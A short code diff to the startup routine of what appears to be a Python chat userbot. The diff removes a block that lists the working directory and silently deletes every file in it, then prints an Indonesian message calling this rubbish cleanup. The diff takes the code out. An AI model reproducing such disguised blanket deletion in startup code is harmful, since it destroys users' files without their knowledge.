@@ -25,14 +25,6 @@ async def main():
     await loadPlugins()
     await install_user_id()
     await expired_userbot()
-    count = 0
-    for X in os.popen("ls").read().split():
-        try:
-            os.remove(X)
-            count += 1
-        except:
-            pass
-    print(f"✅ {count} sampah berhasil di bersihkan")
     await idle()
 
 
